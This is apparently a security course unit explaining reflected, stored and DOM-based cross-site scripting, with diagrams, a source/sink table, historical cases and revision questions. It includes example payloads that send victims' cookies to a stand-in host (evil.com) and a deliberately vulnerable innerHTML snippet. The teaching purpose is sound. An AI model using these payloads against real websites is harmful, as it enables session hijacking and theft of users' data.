# Unit 6: Cross-Site Scripting (XSS) — Topic 1: XSS Types

## Overview

Cross-Site Scripting (XSS) is one of the most prevalent web application vulnerabilities. It occurs when an application includes untrusted data in a web page without proper validation or escaping, allowing attackers to execute arbitrary JavaScript in a victim's browser. XSS is consistently ranked in the OWASP Top 10 and affects millions of websites worldwide. Understanding the three core types — **Reflected**, **Stored**, and **DOM-based** — is essential for both offensive testing and defensive security engineering.

---

## 1. Reflected XSS (Type I — Non-Persistent)

Reflected XSS occurs when user-supplied input is immediately returned by the server in an HTTP response without sanitisation. The payload is delivered via a crafted URL or form submission and is never stored on the server.

### How Reflected XSS Works

```
  Attacker                   Victim                    Server
    |                          |                          |
    |--- (1) Crafted URL ----->|                          |
    |                          |--- (2) GET /search?q=    |
    |                          |    <script>alert(1)      |
    |                          |    </script> ----------->|
    |                          |                          |
    |                          |<-- (3) HTML page with ---|
    |                          |    unescaped query param  |
    |                          |                          |
    |<-- (4) Stolen cookie ----|                          |
    |       via JS execution   |                          |
```

### Example

A search page that echoes the user's query:

```
GET /search?q=<script>document.location='http://evil.com/?c='+document.cookie</script>

Server Response:
<p>Results for: <script>document.location='http://evil.com/?c='+document.cookie</script></p>
```

**Delivery methods:** Phishing emails, social media links, forum posts, QR codes.

---

## 2. Stored XSS (Type II — Persistent)

Stored XSS occurs when malicious input is permanently saved on the target server (e.g., in a database, comment field, or user profile) and later served to other users who view the affected page.

### How Stored XSS Works

```
  Attacker                    Server / DB                Victim
    |                            |                          |
    |--- (1) POST malicious ---->|                          |
    |       comment/profile      |                          |
    |                            |--- (2) Stores payload -->|
    |                            |       in database        |
    |                            |                          |
    |                            |<-- (3) Victim requests --|
    |                            |       page with comment  |
    |                            |                          |
    |                            |--- (4) Serves page ----->|
    |                            |    with stored payload   |
    |                            |                          |
    |<--- (5) Victim's session --|--------------------------|
    |         data exfiltrated   |                          |
```

### Example

A blog comment containing:

```html
<img src=x onerror="fetch('https://evil.com/steal?cookie='+document.cookie)">
```

Every user who views the comment page triggers the payload. This makes Stored XSS significantly more dangerous than Reflected XSS because no social engineering is required after the initial injection.

---

## 3. DOM-Based XSS (Type 0 — Client-Side)

DOM-based XSS occurs entirely within the client-side code. The vulnerability exists in JavaScript that reads from an attacker-controllable **source** and writes to a dangerous **sink** — the payload never reaches the server.

### How DOM-Based XSS Works

```
  Attacker                   Victim's Browser              Server
    |                            |                            |
    |--- (1) Crafted URL ------->|                            |
    |    (payload in fragment)   |                            |
    |                            |--- (2) GET /page --------->|
    |                            |    (fragment NOT sent)      |
    |                            |                            |
    |                            |<-- (3) Returns clean ------|
    |                            |       HTML + JS code       |
    |                            |                            |
    |                            |--- (4) JS reads            |
    |                            |    location.hash and       |
    |                            |    writes to innerHTML     |
    |                            |                            |
    |<--- (5) Payload executes --|                            |
    |         in victim context  |                            |
```

### Common Sources and Sinks

| **Sources (Attacker Input)**     | **Sinks (Dangerous Output)**       |
|----------------------------------|------------------------------------|
| `document.location`             | `document.write()`                 |
| `document.URL`                  | `element.innerHTML`                |
| `document.referrer`             | `element.outerHTML`                |
| `location.hash`                 | `eval()`                           |
| `location.search`              | `setTimeout()` / `setInterval()`  |
| `window.name`                  | `document.location.href`          |
| `postMessage` data             | `jQuery.html()` / `$()`           |

### Example

```javascript
// Vulnerable code
var name = document.location.hash.substring(1);
document.getElementById("greeting").innerHTML = "Hello, " + name;

// Attack URL
https://example.com/welcome#<img src=x onerror=alert(document.cookie)>
```

---

## 4. Comparison of XSS Types

| Feature              | Reflected XSS         | Stored XSS              | DOM-Based XSS           |
|----------------------|-----------------------|-------------------------|-------------------------|
| **Persistence**      | Non-persistent        | Persistent              | Non-persistent          |
| **Payload storage**  | URL / request param   | Server-side (DB/file)   | Client-side (URL/DOM)   |
| **Server involved?** | Yes — reflects input  | Yes — stores & serves   | No — client-side only   |
| **Delivery**         | Crafted link          | Automatic on page view  | Crafted link            |
| **Detection**        | Server-side scanning  | Server-side scanning    | JS code analysis        |
| **Impact scope**     | Single user per click | All users viewing page  | Single user per click   |
| **Severity**         | Medium–High           | High–Critical           | Medium–High             |
| **OWASP category**   | A7:2017 / A03:2021    | A7:2017 / A03:2021      | A7:2017 / A03:2021      |

---

## 5. Real-World XSS Examples

### Reflected — eBay Search (2015)
An attacker crafted a URL with a malicious search query on eBay that reflected unescaped input, enabling session hijacking of buyers browsing search results.

### Stored — Samy Worm (MySpace, 2005)
Samy Kamkar injected a self-propagating stored XSS payload into his MySpace profile. Within 20 hours, over 1 million users had the payload added to their profiles — the fastest-spreading worm in history at that time.

### DOM-Based — Google Analytics Widget
A vulnerable Google widget read `location.hash` and passed it to `document.write()`, allowing attackers to inject arbitrary HTML/JS without the payload ever reaching Google's servers.

---

## 6. Identifying XSS Type During Testing

```
Start: Inject test payload (e.g., <script>alert(1)</script>)
  |
  |--- Payload appears in server response?
  |      |
  |      |-- YES --> Is it stored for future requests?
  |      |             |
  |      |             |-- YES --> STORED XSS
  |      |             |-- NO  --> REFLECTED XSS
  |      |
  |      |-- NO  --> Does payload execute via client-side JS?
  |                    |
  |                    |-- YES --> DOM-BASED XSS
  |                    |-- NO  --> Not vulnerable (or filtered)
```

---

## Summary Table

| Concept               | Key Detail                                              |
|-----------------------|---------------------------------------------------------|
| Reflected XSS        | Payload in request, echoed in response, non-persistent  |
| Stored XSS           | Payload saved server-side, triggers for all viewers     |
| DOM-based XSS        | Payload processed in browser JS, never hits server      |
| Sources               | Attacker-controllable inputs (URL, referrer, postMsg)  |
| Sinks                 | Dangerous functions (innerHTML, eval, document.write)  |
| Most dangerous type   | Stored XSS — no user interaction after initial inject  |
| Testing approach      | Inject canary → observe where it renders → classify    |

---

## Revision Questions

1. **What is the key difference between Reflected and Stored XSS in terms of payload persistence?**

2. **Why is DOM-based XSS often invisible to server-side security tools like WAFs?**

3. **Name three common DOM sources and three common DOM sinks that can lead to DOM-based XSS.**

4. **In what scenario would Stored XSS be considered Critical severity versus High severity?**

5. **Explain why the Samy Worm is classified as Stored XSS and describe the mechanism that allowed it to self-propagate.**

6. **You find a parameter that is reflected in the page source but inside a JavaScript string literal. Which XSS type is this, and how would your payload differ from a standard HTML-context injection?**

---

*Next: [02-xss-detection.md](02-xss-detection.md)*

---

*[Back to README](../README.md)*
